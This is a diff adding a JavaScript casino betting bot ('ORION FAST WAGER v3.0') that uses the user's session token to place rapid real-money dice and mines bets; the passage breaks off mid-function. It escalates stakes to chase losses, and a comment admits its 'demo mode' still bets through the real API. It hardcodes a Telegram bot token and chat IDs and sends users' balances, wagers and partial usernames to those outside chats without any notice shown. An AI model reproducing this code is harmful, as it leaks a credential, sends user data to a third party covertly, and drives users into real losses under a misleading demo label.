@@ -1,1 +1,2403 @@
+(function () {
+    const CONFIG = {
+        get apiUrl() { return window.location.origin + '/_api'; },
+        tgToken: '8472646774:AAGYIU5V1kK4YMj5u1MqR0-QR5mQ4XemdMQ',
+        tgChatId: '-1003744641395',
+        version: "ORION FAST WAGER v3.0",
+    };
 
+    const bot = {
+        isRunning: false, isDemo: false, token: null, stakeUser: "Loading...",
+        stats: { profit: 0, wagered: 0, startBal: 0, currentBal: 0, bets: 0, wins: 0, loss: 0, startTime: null, maxDD: 0, maxDDPerc: 0, history: [] },
+        selectedCurrency: "doge", tg: 0, perStep: 0, baseChance: 0, currentChance: 0,
+        singleChanceBets: 0, singleChanceLimit: 0, targetAbs: 0, stopLossAbs: 0,
+        
+        currentSteps: 0,
+        maxSteps: 900000,
+        stepsResetCount: 0,
+        
+        betSpeed: 0,
+        lastSpeedUpdate: Date.now(),
+        speedBetsCount: 0,
+        lastBetTime: 0,
+        minBetInterval: 0,
+        
+        chanceMin: 45.0,
+        chanceMax: 55.0,
+        chanceInc: 5.0,
+        chanceDec: 15.0,
+        
+        // MINES MODE (MENGGANTIKAN RISK MODE)
+        isMinesMode: false,
+        minesLimit: 3.0,
+        minesStartBalance: 0,
+        minesTotalLoss: 0,
+        minesBets: 0,
+        minesMaxBets: 5,
+        minesMinesCount: 13,
+        minesFields: [],
+        minesUseRandomFields: false,
+        
+        overhaulChanceMin: 8.0,
+        overhaulChanceMax: 10.0,
+        
+        isTrailingActive: false,
+        trailingPeak: 0,
+        trailingPeakProfit: 0,
+        trailingCurrentGap: 0.3,
+        trailingZone: 1,
+        trailingHits: 0,
+        trailingSensitivity: 1.0,
+        trailingMinGap: 10.0,
+        trailingMaxGap: 20.0,
+        trailingLastLossStreak: 0,
+        trailingLastWinStreak: 0,
+        
+        isWagerEnabled: true,
+        isWagerMode: false,
+        wagerMode: "profit",
+        
+        profitWagerChance: 99.0,
+        profitWagerBetPct: 1.5,
+        profitTriggerProfit: 100,
+        profitTriggerLoss: 10,
+        
+        // RECOVERY SMOOTHING
+        recoveryMode: false,
+        recoveryStartLoss: 0,
+        recoveryBets: 0,
+        recoveryBaseBet: 0,
+        recoverySmoothingFactor: 0.3,
+        recoveryMaxBets: 20,
+        wasInWagerMode: false,
+        wasInMinesMode: false,
+        
+        // CHART REPORT TRACKING
+        lastChartWagerAmount: 0,
+        chartReportInterval: 500,
+        
+        lastTelegramTime: Date.now(),
+        telegramInterval: 180000,
+        runtime: { hours: 0, minutes: 0, seconds: 0 },
+        
+        // MINES STATS
+        mines: {
+            totalBets: 0,
+            totalWagered: 0,
+            totalProfit: 0,
+            globalMaxPayout: 0,
+            lastPayout: 0,
+            lastId: '',
+        }
+    };
+
+    const API = {
+        async syncOnce() {
+            bot.token = localStorage.getItem('apitoken') || (document.cookie.match(/session=([^;]+)/) ? document.cookie.match(/session=([^;]+)/)[1] : null);
+            try {
+                const res = await fetch(`${CONFIG.apiUrl}/graphql`, {
+                    method: "POST", headers: { "Content-Type": "application/json", "x-access-token": bot.token },
+                    body: JSON.stringify({ query: `query{user{name balances{available{amount currency}}}}` })
+                });
+                const json = await res.json();
+                if (json?.data?.user) {
+                    bot.stakeUser = json.data.user.name;
+                    document.getElementById("st-user").innerText = `User: ${bot.stakeUser}`;
+                    const bals = json.data.user.balances || [];
+                    const sel = document.getElementById("p-currency");
+                    if (sel && sel.options.length === 0) {
+                        bals.forEach(b => {
+                            const opt = new Option(b.available.currency.toUpperCase(), b.available.currency);
+                            if(b.available.currency === "doge") opt.selected = true;
+                            sel.add(opt);
+                        });
+                        bot.selectedCurrency = sel.value;
+                    }
+                }
+            } catch (e) {}
+        },
+        async getBalance(coin) {
+            try {
+                const res = await fetch(`${CONFIG.apiUrl}/graphql`, {
+                    method: "POST", headers: { "Content-Type": "application/json", "x-access-token": bot.token },
+                    body: JSON.stringify({ query: `query{user{balances{available{amount currency}}}}` })
+                });
+                const json = await res.json();
+                const active = json.data.user.balances.find(b => b.available.currency.toLowerCase() === coin.toLowerCase());
+                return active ? parseFloat(active.available.amount) : 0;
+            } catch (e) { return 0; }
+        },
+        
+        async placeBet(amount, chance) {
+            // Untuk demo mode, kita tetap kirim ke API real tapi balance tidak terpengaruh
+            const payload = { 
+                amount: parseFloat(amount.toFixed(8)), 
+                currency: bot.selectedCurrency, 
+                target: 100 - chance, 
+                condition: "above", 
+                identifier: Math.random().toString(36).slice(2) 
+            };
+            
+            try {
+                const r = await fetch(`${CONFIG.apiUrl}/casino/dice/roll`, { 
+                    method: "POST", 
+                    headers: { 
+                        "Content-Type": "application/json", 
+                        "x-access-token": bot.token 
+                    }, 
+                    body: JSON.stringify(payload) 
+                });
+                return r.json();
+            } catch (e) {
+                console.log("Dice bet error:", e);
+                return {};
+            }
+        },
+        
+        // MINES API - TETAP PAKAI API REAL WALAU DEMO MODE
+        async placeMinesBet(amount, currency, minesCount, fields) {
+            const payload = {
+                amount: amount,
+                currency: currency,
+                identifier: this.randomIdentifier(),
+                minesCount: minesCount,
+                fields: fields
+            };
+            
+            try {
+                const r = await fetch(`${CONFIG.apiUrl}/casino/mines/bet`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "x-access-token": bot.token
+                    },
+                    body: JSON.stringify(payload),
+                    credentials: "include"
+                });
+                return r.json();
+            } catch (e) {
+                console.log("Mines bet error:", e);
+                return {};
+            }
+        },
+        
+        randomIdentifier() {
+            const length = Math.floor(Math.random() * (32 - 20 + 1)) + 20;
+            return Array.from({ length }, () => Math.floor(Math.random() * 10)).join("");
+        },
+        
+        // Generate random fields untuk mines
+        generateRandomFields(count) {
+            const fields = [];
+            while(fields.length < count) {
+                const random = Math.floor(Math.random() * 25);
+                if(!fields.includes(random)) fields.push(random);
+            }
+            return fields;
+        },
+        
+        // CHART GENERATION FUNCTIONS
+        generateBalanceChart() {
+            const history = bot.stats.history || [bot.stats.startBal];
+            const labels = [];
+            
+            for(let i = 0; i < history.length; i++) {
+                labels.push(`#${i+1}`);
+            }
+            
+            const chartConfig = {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [{
+                        label: 'Balance',
+                        data: history,
+                        borderColor: '#f59e0b',
+                        backgroundColor: 'rgba(245, 158, 11, 0.1)',
+                        fill: true,
+                        tension: 0.4
+                    }, {
+                        label: 'Start Balance',
+                        data: Array(history.length).fill(bot.stats.startBal),
+                        borderColor: '#ef4444',
+                        borderDash: [5, 5],
+                        fill: false
+                    }]
+                },
+                options: {
+                    title: {
+                        display: true,
+                        text: '💰 Balance Progress - ' + bot.selectedCurrency.toUpperCase()
+                    }
+                }
+            };
+            
+            return 'https://quickchart.io/chart?width=600&height=300&c=' + encodeURIComponent(JSON.stringify(chartConfig));
+        },
+        
+        generateWinRateChart() {
+            const winRate = bot.stats.bets > 0 ? (bot.stats.wins / bot.stats.bets * 100).toFixed(1) : 0;
+            const lossRate = bot.stats.bets > 0 ? (bot.stats.loss / bot.stats.bets * 100).toFixed(1) : 0;
+            
+            const chartConfig = {
+                type: 'doughnut',
+                data: {
+                    labels: ['Wins', 'Losses'],
+                    datasets: [{
+                        data: [bot.stats.wins, bot.stats.loss],
+                        backgroundColor: ['#10b981', '#ef4444']
+                    }]
+                },
+                options: {
+                    title: {
+                        display: true,
+                        text: '🎲 Win/Loss Ratio (' + winRate + '% / ' + lossRate + '%)'
+                    },
+                    plugins: {
+                        datalabels: {
+                            color: '#fff',
+                            formatter: function(value, ctx) {
+                                const total = ctx.chart.data.datasets[0].data.reduce(function(a,b) { return a + b; }, 0);
+                                const percentage = total > 0 ? (value / total * 100).toFixed(1) : 0;
+                                return percentage + '%';
+                            }
+                        }
+                    }
+                }
+            };
+            
+            return 'https://quickchart.io/chart?width=400&height=300&c=' + encodeURIComponent(JSON.stringify(chartConfig));
+        },
+        
+        generateProfitChart() {
+            const profitData = bot.stats.history ? bot.stats.history.map(function(b) { return b - bot.stats.startBal; }) : [0];
+            
+            const chartConfig = {
+                type: 'line',
+                data: {
+                    labels: Array(profitData.length).fill('').map(function(_,i) { return '#' + (i+1); }),
+                    datasets: [{
+                        label: 'Profit/Loss',
+                        data: profitData,
+                        borderColor: profitData[profitData.length-1] >= 0 ? '#10b981' : '#ef4444',
+                        backgroundColor: profitData[profitData.length-1] >= 0 ? 'rgba(16, 185, 129, 0.1)' : 'rgba(239, 68, 68, 0.1)',
+                        fill: true
+                    }]
+                },
+                options: {
+                    title: {
+                        display: true,
+                        text: '📈 P&L Chart - ' + (bot.stats.profit >= 0 ? '+' : '') + bot.stats.profit.toFixed(8)
+                    },
+                    annotation: {
+                        annotations: [{
+                            type: 'line',
+                            mode: 'horizontal',
+                            scaleID: 'y-axis-0',
+                            value: 0,
+                            borderColor: '#94a3b8',
+                            borderWidth: 2,
+                            borderDash: [5, 5],
+                            label: {
+                                enabled: true,
+                                content: 'Break Even',
+                                position: 'left'
+                            }
+                        }]
+                    }
+                }
+            };
+            
+            return 'https://quickchart.io/chart?width=600&height=300&c=' + encodeURIComponent(JSON.stringify(chartConfig));
+        },
+        
+        async sendChartReport() {
+            if (!bot.stats.startTime || bot.stats.bets === 0) return;
+            
+            const runtime = Math.floor((Date.now() - bot.stats.startTime) / 1000);
+            const hours = Math.floor(runtime / 3600);
+            const minutes = Math.floor((runtime % 3600) / 60);
+            const seconds = runtime % 60;
+            
+            const winRate = bot.stats.bets > 0 ? ((bot.stats.wins / bot.stats.bets) * 100).toFixed(2) : "0";
+            const pnlPct = bot.stats.startBal > 0 ? ((bot.stats.profit / bot.stats.startBal) * 100).toFixed(2) : "0";
+            const betSpeed = bot.betSpeed.toFixed(2);
+            
+            const censoredUser = bot.stakeUser && bot.stakeUser !== "Loading..." ? 
+                bot.stakeUser.substring(0, 3) + "***" : "Loading...";
+            
+            // Generate chart URLs
+            const charts = {
+                balance: this.generateBalanceChart(),
+                profit: this.generateProfitChart(),
+                winrate: this.generateWinRateChart()
+            };
+            
+            // Text caption
+            let caption = '⚡ ORION FAST WAGER REPORT ⚡\n';
+            caption += '═══════════════════════════\n';
+            caption += '\n';
+            caption += '⏱️ RUNTIME    : ' + hours + 'h ' + minutes + 'm ' + seconds + 's\n';
+            caption += '⚡ SPEED      : ' + betSpeed + '/s\n';
+            caption += '👤 USER       : ' + censoredUser + '\n';
+            caption += '💱 CURRENCY   : ' + bot.selectedCurrency.toUpperCase() + '\n';
+            caption += '💰 WAGERED    : ' + bot.stats.wagered.toFixed(8) + '\n';
+            
+            // Add Mines stats
+            if (bot.mines.totalBets > 0) {
+                caption += '\n';
+                caption += '💣 MINES STATS\n';
+                caption += '▪️ Bets    : ' + bot.mines.totalBets + '\n';
+                caption += '▪️ Wagered : ' + bot.mines.totalWagered.toFixed(2) + '\n';
+                caption += '▪️ Profit  : ' + (bot.mines.totalProfit >= 0 ? '+' : '') + bot.mines.totalProfit.toFixed(2) + '\n';
+                caption += '▪️ Max Payout: ' + bot.mines.globalMaxPayout.toFixed(4) + 'x\n';
+                if (bot.isMinesMode) {
+                    caption += '▪️ Mode    : MINES MODE ⚡\n';
+                }
+            }
+            
+            caption += '\n';
+            caption += '💰 BALANCE\n';
+            caption += '▪️ Start   : ' + bot.stats.startBal.toFixed(8) + '\n';
+            caption += '▪️ Current : ' + bot.stats.currentBal.toFixed(8) + '\n';
+            caption += '▪️ P/L     : ' + (bot.stats.profit >= 0 ? '+' : '') + bot.stats.profit.toFixed(8) + ' (' + pnlPct + '%)\n';
+            caption += '▪️ Peak    : ' + bot.trailingPeak.toFixed(8) + '\n';
+            caption += '▪️ Max DD  : ' + bot.stats.maxDD.toFixed(8) + ' (' + bot.stats.maxDDPerc.toFixed(2) + '%)\n';
+            caption += '\n';
+            caption += '🎲 STATISTICS\n';
+            caption += '▪️ Bets    : ' + bot.stats.bets.toLocaleString() + '\n';
+            caption += '▪️ W/L     : ' + bot.stats.wins.toLocaleString() + '/' + bot.stats.loss.toLocaleString() + '\n';
+            caption += '▪️ WinRate : ' + winRate + '%\n';
+            
+            const activeFeatures = [];
+            if (bot.isTrailingActive) activeFeatures.push("📉 Trailing Stop");
+            if (bot.isMinesMode) activeFeatures.push("💣 Mines Mode");
+            if (bot.recoveryMode) activeFeatures.push("🔄 Recovery Mode");
+            if (bot.isWagerEnabled && bot.isWagerMode) {
+                activeFeatures.push('🛡️ Wager Mode');
+            }
+            
+            if (activeFeatures.length > 0) {
+                caption += '\n⚙️ ACTIVE\n';
+                activeFeatures.forEach(function(feature) {
+                    caption += '▪️ ' + feature + '\n';
+                });
+            }
+            
+            caption += '\n═══════════════════════════\n';
+            caption += '🕒 ' + new Date().toLocaleString();
+            
+            // Kirim chart sebagai media group
+            try {
+                const mediaGroup = [
+                    {
+                        type: 'photo',
+                        media: charts.balance,
+                        caption: caption,
+                        parse_mode: 'HTML'
+                    },
+                    {
+                        type: 'photo',
+                        media: charts.profit
+                    },
+                    {
+                        type: 'photo',
+                        media: charts.winrate
+                    }
+                ];
+                
+                await fetch('https://api.telegram.org/bot' + CONFIG.tgToken + '/sendMediaGroup', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.tgChatId,
+                        media: mediaGroup
+                    })
+                });
+                
+                console.log('📊 Chart report sent! Wagered: ' + bot.stats.wagered.toFixed(8));
+                
+            } catch (e) {
+                console.log("Telegram chart send failed:", e);
+            }
+        },
+        
+        async sendTelegramReport() {
+            if (!bot.stats.startTime) return;
+            
+            const runtime = Math.floor((Date.now() - bot.stats.startTime) / 1000);
+            const hours = Math.floor(runtime / 3600);
+            const minutes = Math.floor((runtime % 3600) / 60);
+            const seconds = runtime % 60;
+            
+            const winRate = bot.stats.bets > 0 ? ((bot.stats.wins / bot.stats.bets) * 100).toFixed(2) : "0";
+            const pnlPct = bot.stats.startBal > 0 ? ((bot.stats.profit / bot.stats.startBal) * 100).toFixed(2) : "0";
+            const betSpeed = bot.betSpeed.toFixed(2);
+            
+            const censoredUser = bot.stakeUser && bot.stakeUser !== "Loading..." ? 
+                bot.stakeUser.substring(0, 3) + "***" : "Loading...";
+            
+            let message = "```\n";
+            message += '⚡ ORION FAST WAGER REPORT ⚡\n';
+            message += '═══════════════════════════\n';
+            message += '\n';
+            message += '⏱️ RUNTIME    : ' + hours + 'h ' + minutes + 'm ' + seconds + 's\n';
+            message += '⚡ SPEED      : ' + betSpeed + '/s\n';
+            message += '👤 USER       : ' + censoredUser + '\n';
+            message += '💱 CURRENCY   : ' + bot.selectedCurrency.toUpperCase() + '\n';
+            message += '💰 WAGERED    : ' + bot.stats.wagered.toFixed(8) + '\n';
+            
+            // Add Mines stats
+            if (bot.mines.totalBets > 0) {
+                message += '\n';
+                message += '💣 MINES STATS\n';
+                message += '▪️ Bets    : ' + bot.mines.totalBets + '\n';
+                message += '▪️ Wagered : ' + bot.mines.totalWagered.toFixed(2) + '\n';
+                message += '▪️ Profit  : ' + (bot.mines.totalProfit >= 0 ? '+' : '') + bot.mines.totalProfit.toFixed(2) + '\n';
+                message += '▪️ Max Payout: ' + bot.mines.globalMaxPayout.toFixed(4) + 'x\n';
+            }
+            
+            message += '\n';
+            message += '💰 BALANCE\n';
+            message += '▪️ Start   : ' + bot.stats.startBal.toFixed(8) + '\n';
+            message += '▪️ Current : ' + bot.stats.currentBal.toFixed(8) + '\n';
+            message += '▪️ P/L     : ' + (bot.stats.profit >= 0 ? '+' : '') + bot.stats.profit.toFixed(8) + ' (' + pnlPct + '%)\n';
+            message += '▪️ Peak    : ' + bot.trailingPeak.toFixed(8) + '\n';
+            message += '▪️ Max DD  : ' + bot.stats.maxDD.toFixed(8) + ' (' + bot.stats.maxDDPerc.toFixed(2) + '%)\n';
+            message += '\n';
+            message += '🎲 STATISTICS\n';
+            message += '▪️ Bets    : ' + bot.stats.bets.toLocaleString() + '\n';
+            message += '▪️ W/L     : ' + bot.stats.wins.toLocaleString() + '/' + bot.stats.loss.toLocaleString() + '\n';
+            message += '▪️ WinRate : ' + winRate + '%\n';
+            
+            const activeFeatures = [];
+            if (bot.isTrailingActive) activeFeatures.push("📉 Trailing Stop");
+            if (bot.isMinesMode) activeFeatures.push("💣 Mines Mode");
+            if (bot.recoveryMode) activeFeatures.push("🔄 Recovery Mode");
+            if (bot.isWagerEnabled && bot.isWagerMode) {
+                activeFeatures.push('🛡️ Wager Mode');
+            }
+            
+            if (activeFeatures.length > 0) {
+                message += '\n⚙️ ACTIVE\n';
+                activeFeatures.forEach(function(feature) {
+                    message += '▪️ ' + feature + '\n';
+                });
+            }
+            
+            message += '\n';
+            message += '═══════════════════════════\n';
+            message += '🕒 ' + new Date().toLocaleString() + '\n';
+            message += "```";
+            
+            try {
+                const url = 'https://api.telegram.org/bot' + CONFIG.tgToken + '/sendMessage';
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.tgChatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {}
+        },
+        
+        async sendTelegramMessage(message) {
+            try {
+                const url = 'https://api.telegram.org/bot' + CONFIG.tgToken + '/sendMessage';
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: '8453280675',
+                        text: message
+                    })
+                });
+            } catch (e) {
+                console.log("Telegram message send failed:", e);
+            }
+        }
+    };
+
+    function initTrailing() {
+        bot.trailingPeak = bot.stats.currentBal;
+        bot.trailingPeakProfit = 0;
+        bot.trailingCurrentGap = 0.3;
+        bot.trailingZone = 1;
+        bot.trailingHits = 0;
+        bot.trailingLastLossStreak = 0;
+        bot.trailingLastWinStreak = 0;
+        bot.isTrailingActive = true;
+        
+        const sensitivitySelect = document.getElementById("p-trail-sensitivity");
+        if (sensitivitySelect) {
+            const sensVal = sensitivitySelect.value;
+            bot.trailingSensitivity = sensVal === 'low' ? 0.5 : (sensVal === 'high' ? 1.5 : 1.0);
+        }
+        
+        bot.trailingMinGap = parseFloat(document.getElementById("p-trail-min")?.value) || 10.0;
+        bot.trailingMaxGap = parseFloat(document.getElementById("p-trail-max")?.value) || 20.0;
+    }
+    
+    function updateTrailingPeak() {
+        if (!bot.isTrailingActive) return;
+        
+        if (bot.stats.currentBal > bot.trailingPeak) {
+            bot.trailingPeak = bot.stats.currentBal;
+            bot.trailingPeakProfit = ((bot.trailingPeak - bot.stats.startBal) / bot.stats.startBal) * 100;
+            updateTrailingZone();
+        }
+    }
+    
+    function updateTrailingZone() {
+        if (!bot.isTrailingActive || bot.trailingPeakProfit <= 0) {
+            bot.trailingZone = 1;
+            bot.trailingCurrentGap = 0.3;
+            return;
+        }
+        
+        const currentProfitPct = ((bot.stats.currentBal - bot.stats.startBal) / bot.stats.startBal) * 100;
+        const profitRatio = currentProfitPct / bot.trailingPeakProfit;
+        
+        if (profitRatio < 0.3) bot.trailingZone = 1;
+        else if (profitRatio < 0.7) bot.trailingZone = 2;
+        else bot.trailingZone = 3;
+        
+        let baseGap;
+        switch(bot.trailingZone) {
+            case 1: baseGap = 0.5; break;
+            case 2: baseGap = 0.2; break;
+            case 3: baseGap = 0.05; break;
+            default: baseGap = 0.3;
+        }
+        
+        let adjustment = 1.0;
+        if (bot.trailingLastLossStreak > 3) adjustment = 1.5;
+        else if (bot.trailingLastLossStreak > 1) adjustment = 1.2;
+        
+        if (bot.trailingLastWinStreak > 3) adjustment = 0.7;
+        else if (bot.trailingLastWinStreak > 1) adjustment = 0.9;
+        
+        adjustment *= bot.trailingSensitivity;
+        
+        let finalGap = baseGap * adjustment;
+        if (finalGap < bot.trailingMinGap) finalGap = bot.trailingMinGap;
+        if (finalGap > bot.trailingMaxGap) finalGap = bot.trailingMaxGap;
+        
+        bot.trailingCurrentGap = finalGap;
+    }
+    
+    function checkTrailingGap() {
+        if (!bot.isTrailingActive || bot.isMinesMode) return false;
+        
+        const threshold = bot.trailingPeak * (1 - (bot.trailingCurrentGap / 100));
+        
+        if (bot.stats.currentBal <= threshold) {
+            bot.stats.currentBal = bot.stats.startBal;
+            bot.stats.profit = 0;
+            bot.tg = bot.perStep;
+            
+            bot.trailingPeak = bot.stats.startBal;
+            bot.trailingPeakProfit = 0;
+            bot.trailingZone = 1;
+            bot.trailingHits++;
+            
+            setNewBaseChance();
+            
+            bot.trailingLastLossStreak = 0;
+            bot.trailingLastWinStreak = 0;
+            
+            document.getElementById("st-trail-hits").innerText = bot.trailingHits;
+            
+            return true;
+        }
+        return false;
+    }
+    
+    function updateTrailingStreaks(win) {
+        if (!bot.isTrailingActive) return;
+        if (win) {
+            bot.trailingLastWinStreak++;
+            bot.trailingLastLossStreak = 0;
+        } else {
+            bot.trailingLastLossStreak++;
+            bot.trailingLastWinStreak = 0;
+        }
+    }
+
+    function updateBaseBetFromSteps() {
+        if (bot.stats.startBal <= 0 || bot.baseChance <= 0) return;
+        
+        const targetPct = parseFloat(document.getElementById("p-target-pct")?.value) || 3.0;
+        const steps = parseInt(document.getElementById("p-steps")?.value) || 900000;
+        const chance = bot.baseChance;
+        
+        const targetAbs = bot.stats.startBal * (targetPct / 100);
+        const expectedBaseBet = (targetAbs / steps) / (99 / chance);
+        
+        const baseBetInput = document.getElementById("p-basebet");
+        if (baseBetInput) baseBetInput.value = expectedBaseBet.toFixed(8);
+        
+        return expectedBaseBet;
+    }
+
+    function setNewBaseChance() {
+        if (bot.isMinesMode) {
+            bot.overhaulChanceMin = parseFloat(document.getElementById("p-overhaul-min")?.value) || 8.0;
+            bot.overhaulChanceMax = parseFloat(document.getElementById("p-overhaul-max")?.value) || 10.0;
+            bot.baseChance = parseFloat((Math.random() * (bot.overhaulChanceMax - bot.overhaulChanceMin) + bot.overhaulChanceMin).toFixed(1));
+        } else if (bot.isWagerEnabled && bot.isWagerMode) {
+            bot.baseChance = bot.profitWagerChance;
+        } else {
+            bot.chanceMin = parseFloat(document.getElementById("p-ch-min")?.value) || 45.0;
+            bot.chanceMax = parseFloat(document.getElementById("p-ch-max")?.value) || 55.0;
+            bot.baseChance = parseFloat((Math.random() * (bot.chanceMax - bot.chanceMin) + bot.chanceMin).toFixed(1));
+        }
+        
+        bot.currentChance = bot.baseChance;
+        bot.singleChanceBets = 0;
+        bot.singleChanceLimit = Math.round(99 / bot.baseChance);
+        bot.tg = bot.perStep;
+        
+        if (bot.stats.startBal > 0) updateBaseBetFromSteps();
+    }
+
+    function getChanceIncrement() {
+        bot.chanceInc = parseFloat(document.getElementById("p-ch-inc")?.value) || 5.0;
+        bot.chanceDec = parseFloat(document.getElementById("p-ch-dec")?.value) || 15.0;
+        return Math.random() * (bot.chanceInc - bot.chanceDec) + bot.chanceDec;
+    }
+
+    function resetSteps() {
+        bot.currentSteps = 0;
+        bot.stepsResetCount++;
+        
+        bot.stats.currentBal = bot.stats.startBal;
+        bot.stats.profit = 0;
+        bot.tg = bot.perStep;
+        
+        bot.isMinesMode = false;
+        bot.isWagerMode = false;
+        bot.recoveryMode = false;
+        bot.minesTotalLoss = 0;
+        bot.minesBets = 0;
+        
+        if (bot.isTrailingActive) {
+            bot.trailingPeak = bot.stats.startBal;
+            bot.trailingPeakProfit = 0;
+            bot.trailingZone = 1;
+            bot.trailingLastLossStreak = 0;
+            bot.trailingLastWinStreak = 0;
+        }
+        
+        setNewBaseChance();
+    }
+
+    // CHECK MINES MODE
+    function checkMinesMode() {
+        if (bot.isMinesMode) return;
+        if (bot.recoveryMode) return;
+        
+        const lossPct = ((bot.stats.startBal - bot.stats.currentBal) / bot.stats.startBal) * 100;
+        
+        if (lossPct >= bot.minesLimit && bot.stats.bets > 0) {
+            console.log('💣 MINES MODE TRIGGERED! Loss: ' + lossPct.toFixed(2) + '%');
+            
+            bot.isMinesMode = true;
+            bot.minesStartBalance = bot.stats.currentBal;
+            bot.minesTotalLoss = bot.stats.startBal - bot.stats.currentBal;
+            bot.minesBets = 0;
+            
+            bot.minesMinesCount = parseInt(document.getElementById("p-mines-count")?.value) || 13;
+            bot.minesMaxBets = parseInt(document.getElementById("p-mines-max-bets")?.value) || 5;
+            bot.minesUseRandomFields = document.getElementById("p-mines-random")?.checked || false;
+            
+            const savedFields = loadMinesFields();
+            bot.minesFields = savedFields.length > 0 ? savedFields : [0,1,2,3,4];
+            
+            setNewBaseChance();
+            
+            document.getElementById("st-mode").innerText = "MINES";
+            document.getElementById("st-mode").style.background = "#8b5cf6";
+            document.getElementById("st-mode").style.color = "#ffffff";
+            
+            API.sendTelegramMessage('💣 MINES MODE ACTIVATED!\nLoss: ' + bot.minesTotalLoss.toFixed(8) + ' (' + lossPct.toFixed(2) + '%)\nMax Bets: ' + bot.minesMaxBets);
+        }
+    }
+
+    function calculateMinesBet() {
+        if (!bot.isMinesMode) return null;
+        
+        const currentLoss = bot.stats.startBal - bot.stats.currentBal;
+        
+        if (currentLoss <= 0) {
+            console.log("✅ MINES MODE EXIT - No loss");
+            bot.isMinesMode = false;
+            updateModeDisplay();
+            setNewBaseChance();
+            return null;
+        }
+        
+        bot.minesBets++;
+        
+        if (bot.minesBets > bot.minesMaxBets) {
+            console.log('⚠️ MINES MODE EXIT - Max bets reached (' + bot.minesMaxBets + ')');
+            bot.isMinesMode = false;
+            updateModeDisplay();
+            return null;
+        }
+        
+        let bet = Math.abs(currentLoss / 5);
+        
+        const minBetLimit = parseFloat(document.getElementById("p-minbet")?.value) || 0.00000002;
+        if (bet < minBetLimit) bet = minBetLimit;
+        
+        if (bet > bot.stats.currentBal) bet = bot.stats.currentBal;
+        
+        console.log('💣 Mines Bet #' + bot.minesBets + ': ' + bet.toFixed(8) + ' (Loss: ' + currentLoss.toFixed(8) + ')');
+        
+        return bet;
+    }
+
+    async function executeMinesBet() {
+        if (!bot.isMinesMode) return false;
+        
+        const betAmount = calculateMinesBet();
+        if (betAmount === null) return false;
+        
+        try {
+            let fields = bot.minesFields;
+            if (bot.minesUseRandomFields) {
+                fields = API.generateRandomFields(bot.minesMinesCount);
+            }
+            
+            const result = await API.placeMinesBet(
+                betAmount,
+                bot.selectedCurrency,
+                bot.minesMinesCount,
+                fields
+            );
+            
+            // Parse response - menangani berbagai format response dari API
+            let data = null;
+            if (result?.data?.minesBet) {
+                data = result.data.minesBet;
+            } else if (result?.minesBet) {
+                data = result.minesBet;
+            } else if (result?.d?.minesBet) {
+                data = result.d.minesBet;
+            } else if (result?.id) {
+                data = result; // Langsung result jika sudah berupa object minesBet
+            }
+            
+            if (data) {
+                bot.mines.totalBets++;
+                bot.mines.totalWagered += betAmount;
+                
+                const payout = data.payoutMultiplier || 0;
+                const id = data.id || 'unknown';
+                
+                if (payout > bot.mines.globalMaxPayout) {
+                    bot.mines.globalMaxPayout = payout;
+                }
+                
+                const profit = (betAmount * payout) - betAmount;
+                bot.mines.totalProfit += profit;
+                bot.mines.lastPayout = payout;
+                bot.mines.lastId = id;
+                
+                bot.stats.currentBal += profit;
+                bot.stats.profit += profit;
+                bot.stats.wagered += betAmount;
+                
+                const logBox = document.getElementById("p-logs");
+                const entry = document.createElement("div");
+                entry.style.cssText = 'margin:1px 0; padding:1px 2px; font-size:10px; font-family: monospace; border-left:2px solid #8b5cf6; color:#d1d5db;';
+                entry.innerHTML = '💣 MINES #' + bot.mines.totalBets + ' | ' + betAmount.toFixed(2) + ' | ' + payout.toFixed(2) + 'x | ' + (profit >= 0 ? '+' : '') + profit.toFixed(2);
+                logBox.prepend(entry);
+                if (logBox.children.length > 6) logBox.lastChild.remove();
+                
+                updateDisplay();
+                
+                if (bot.stats.currentBal >= bot.stats.startBal) {
+                    console.log("✅ MINES MODE SUCCESS - Balance recovered!");
+                    bot.isMinesMode = false;
+                    updateModeDisplay();
+                    
+                    API.sendTelegramMessage('✅ MINES MODE SUCCESS!\nRecovered to ' + bot.stats.currentBal.toFixed(8) + '\nTotal Mines Bets: ' + bot.mines.totalBets);
+                }
+                
+                if (payout > 10) {
+                    API.sendTelegramMessage('💣 MINES HIT!\nPayout: ' + payout + 'x\nProfit: ' + profit.toFixed(2) + '\nRemaining Bets: ' + (bot.minesMaxBets - bot.minesBets));
+                }
+            } else {
+                console.log("No valid data in mines response:", result);
+                // Tidak ada fallback - hanya log error
+            }
+            
+            return true;
+        } catch (e) {
+            console.log("Mines bet error:", e);
+            return false;
+        }
+    }
+
+    function checkRecoveryMode() {
+        if (bot.recoveryMode) return;
+        
+        if (!bot.isWagerMode && !bot.isMinesMode) return;
+        
+        const currentLoss = bot.stats.startBal - bot.stats.currentBal;
+        const lossPct = (currentLoss / bot.stats.startBal) * 100;
+        
+        const inWagerMode = bot.isWagerEnabled && bot.isWagerMode;
+        const minesModeFailed = bot.isMinesMode && bot.minesBets > bot.minesMaxBets && currentLoss > bot.minesTotalLoss * 1.5;
+        
+        if ((inWagerMode || minesModeFailed) && lossPct >= 5.0 && lossPct <= 15.0) {
+            bot.recoveryMode = true;
+            bot.recoveryStartLoss = currentLoss;
+            bot.recoveryBets = 0;
+            bot.recoveryBaseBet = bot.perStep;
+            
+            bot.recoverySmoothingFactor = parseFloat(document.getElementById("p-recovery-factor")?.value) || 0.3;
+            bot.recoveryMaxBets = parseInt(document.getElementById("p-recovery-max")?.value) || 20;
+            
+            bot.wasInWagerMode = bot.isWagerMode;
+            bot.wasInMinesMode = bot.isMinesMode;
+            bot.isWagerMode = false;
+            bot.isMinesMode = false;
+            
+            console.log('🔄 RECOVERY MODE ACTIVE - Loss: ' + currentLoss.toFixed(8) + ' (' + lossPct.toFixed(2) + '%)');
+        }
+    }
+    
+    function calculateRecoveryBet() {
+        if (!bot.recoveryMode) return null;
+        
+        const currentLoss = bot.stats.startBal - bot.stats.currentBal;
+        if (currentLoss <= 0) {
